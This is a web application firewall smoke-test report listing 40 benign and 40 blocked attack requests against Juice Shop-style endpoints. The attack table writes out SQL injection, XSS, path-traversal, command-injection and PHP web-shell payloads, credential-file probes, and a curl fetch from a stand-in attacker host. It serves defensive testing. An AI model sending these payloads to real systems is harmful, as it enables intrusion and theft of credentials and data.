# Stage A smoke test

Generated: 2026-11-06T15:51:36Z

Target: embedded

Environment note: npm install juice-shop@19.2.0 failed: npm error notarget No matching version found for juice-shop@19.2.0.

## Verdict

- Normal requests: 40
- Normal requests blocked (false positives): 0
- Attack requests: 40
- Attack requests blocked: 40/40
- Criteria: zero false positives and at least 32 of 40 attacks blocked
- Result: PASS

This is a smoke test, not a performance or coverage claim.

## Normal requests

| # | Name | Method | Path | Status | Blocked | Rule |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | home | GET | `/` | 200 | no |  |
| 2 | product search apple | GET | `/rest/products/search?q=apple` | 200 | no |  |
| 3 | product search orange juice | GET | `/rest/products/search?q=orange%20juice` | 200 | no |  |
| 4 | product search unicode | GET | `/rest/products/search?q=%E8%8B%B9%E6%9E%9C` | 200 | no |  |
| 5 | product list | GET | `/api/Products` | 200 | no |  |
| 6 | product detail | GET | `/api/Products/1` | 200 | no |  |
| 7 | feedback list | GET | `/api/Feedbacks` | 200 | no |  |
| 8 | english locale | GET | `/assets/i18n/en.json` | 200 | no |  |
| 9 | product image | GET | `/assets/public/images/products/apple_juice.jpg` | 200 | no |  |
| 10 | favicon | GET | `/favicon.ico` | 200 | no |  |
| 11 | robots | GET | `/robots.txt` | 200 | no |  |
| 12 | sitemap | GET | `/sitemap.xml` | 200 | no |  |
| 13 | whoami | GET | `/rest/user/whoami` | 200 | no |  |
| 14 | login | POST | `/rest/user/login` | 200 | no |  |
| 15 | create feedback | POST | `/api/Feedbacks` | 200 | no |  |
| 16 | basket | GET | `/rest/basket/1` | 200 | no |  |
| 17 | add to basket | POST | `/rest/basket/1/product` | 200 | no |  |
| 18 | product reviews | GET | `/rest/products/1/reviews` | 200 | no |  |
| 19 | update review | PUT | `/rest/products/1/reviews` | 200 | no |  |
| 20 | quantities | GET | `/api/Quantitys` | 200 | no |  |
| 21 | security questions | GET | `/api/SecurityQuestions` | 200 | no |  |
| 22 | challenges | GET | `/api/Challenges` | 200 | no |  |
| 23 | complaints | GET | `/api/Complaints` | 200 | no |  |
| 24 | deliveries | GET | `/api/Deliverys` | 200 | no |  |
| 25 | recycles | GET | `/api/Recycles` | 200 | no |  |
| 26 | cards | GET | `/api/Cards` | 200 | no |  |
| 27 | addresses | GET | `/api/Addresss` | 200 | no |  |
| 28 | basket items | GET | `/api/BasketItems` | 200 | no |  |
| 29 | users | GET | `/api/Users` | 200 | no |  |
| 30 | captcha | GET | `/rest/captcha` | 200 | no |  |
| 31 | reset password | POST | `/rest/user/reset-password` | 200 | no |  |
| 32 | search page | GET | `/search?q=apple` | 200 | no |  |
| 33 | login page | GET | `/login` | 200 | no |  |
| 34 | api search | GET | `/api/Products?search=apple` | 200 | no |  |
| 35 | banana search | GET | `/rest/products/search?q=banana` | 200 | no |  |
| 36 | default upload image | GET | `/assets/public/images/uploads/default.svg` | 200 | no |  |
| 37 | second product | GET | `/api/Products/2` | 200 | no |  |
| 38 | authentication details | GET | `/rest/user/authentication-details` | 200 | no |  |
| 39 | user stylesheet | GET | `/assets/public/css/user.css` | 200 | no |  |
| 40 | paged products | GET | `/api/Products?limit=10&offset=0` | 200 | no |  |

## Attack requests

| # | Name | Method | Path | Status | Blocked | Rule | Reason |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | union select | GET | `/rest/products/search?q=apple%27%20UNION%20SELECT%20id,email,password%20FROM%20Users--` | 403 | yes | sqli.union-select |  |
| 2 | boolean tautology | GET | `/rest/products/search?q=%27%20OR%201%3D1--` | 403 | yes | sqli.boolean |  |
| 3 | stacked drop | GET | `/rest/products/search?q=1%3B%20DROP%20TABLE%20Users` | 403 | yes | sqli.stacked |  |
| 4 | time delay | GET | `/rest/products/search?q=1%20AND%20SLEEP(5)` | 403 | yes | sqli.time |  |
| 5 | union all nulls | GET | `/rest/products/search?q=x%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL--` | 403 | yes | sqli.union-select |  |
| 6 | login comment | POST | `/rest/user/login` | 403 | yes | sqli.comment |  |
| 7 | numeric tautology | GET | `/rest/products/search?q=1%27%20AND%201%3D1%23` | 403 | yes | sqli.boolean |  |
| 8 | information schema | GET | `/rest/products/search?q=1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables` | 403 | yes | sqli.union-select |  |
| 9 | script tag | GET | `/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E` | 403 | yes | xss.script |  |
| 10 | image onerror | GET | `/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E` | 403 | yes | xss.event |  |
| 11 | javascript uri | GET | `/search?q=javascript%3Aalert(document.cookie)` | 403 | yes | xss.javascript-uri |  |
| 12 | iframe injection | GET | `/search?q=%3Ciframe%20src%3D%2F%2Fevil.test%3E` | 403 | yes | xss.iframe |  |
| 13 | svg onload | GET | `/search?q=%3Csvg%20onload%3Dalert(1)%3E` | 403 | yes | xss.event |  |
| 14 | feedback script | POST | `/api/Feedbacks` | 403 | yes | xss.script |  |
| 15 | attribute break | GET | `/search?q=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E` | 403 | yes | xss.script |  |
| 16 | body onload | GET | `/search?q=%3Cbody%20onload%3Dalert(1)%3E` | 403 | yes | xss.event |  |
| 17 | dotdot path | GET | `/assets/../../etc/passwd` | 403 | yes | traversal.dotdot |  |
| 18 | encoded traversal | GET | `/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd` | 403 | yes | traversal.dotdot |  |
| 19 | traversal query | GET | `/download?file=../../../../etc/passwd` | 403 | yes | traversal.dotdot |  |
| 20 | null byte | GET | `/download?file=/etc/passwd%00.jpg` | 403 | yes | traversal.sensitive |  |
| 21 | backslash traversal | GET | `/static/..%5c..%5cwindows%5cwin.ini` | 403 | yes | traversal.dotdot |  |
| 22 | boot ini | GET | `/file?path=..%5c..%5cboot.ini` | 403 | yes | traversal.dotdot |  |
| 23 | shell cat | GET | `/search?q=%3Bcat%20%2Fetc%2Fpasswd` | 403 | yes | traversal.sensitive |  |
| 24 | pipe whoami | GET | `/search?q=127.0.0.1%7Cwhoami` | 403 | yes | rce.shell-meta |  |
| 25 | command substitution | GET | `/search?q=%24(curl%20http%3A%2F%2Fevil.test%2Fx)` | 403 | yes | rce.shell-meta |  |
| 26 | backtick id | GET | `/search?q=%60id%60` | 403 | yes | rce.shell-meta |  |
| 27 | php payload | GET | `/search?q=%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%20%3F%3E` | 403 | yes | rce.php |  |
| 28 | java runtime | GET | `/search?q=java.lang.Runtime.getRuntime().exec('id')` | 403 | yes | rce.java |  |
| 29 | bash path | GET | `/search?q=%2Fbin%2Fbash%20-c%20whoami` | 403 | yes | rce.shell-name |  |
| 30 | cmd exe | GET | `/search?q=cmd.exe%20%2Fc%20dir` | 403 | yes | rce.shell-name |  |
| 31 | php form field | POST | `/file-upload` | 403 | yes | rce.php |  |
| 32 | phpinfo | GET | `/search?q=phpinfo()` | 403 | yes | rce.php |  |
| 33 | sqlmap agent | GET | `/` | 403 | yes | scanner.user-agent |  |
| 34 | nikto agent | GET | `/` | 403 | yes | scanner.user-agent |  |
| 35 | nuclei agent | GET | `/` | 403 | yes | scanner.user-agent |  |
| 36 | git config probe | GET | `/.git/config` | 403 | yes | scanner.path |  |
| 37 | wordpress probe | GET | `/wp-admin/` | 403 | yes | scanner.path |  |
| 38 | env probe | GET | `/.env` | 403 | yes | scanner.path |  |
| 39 | server status probe | GET | `/server-status` | 403 | yes | scanner.secret |  |
| 40 | aws credentials probe | GET | `/.aws/credentials` | 403 | yes | scanner.secret |  |

Unblocked attacks: 0. Each is listed above with the reason that no default rule matched.

Juice Shop was not available from npm, so this run used the committed fallback corpus. The real upstream integration is the remaining gap.
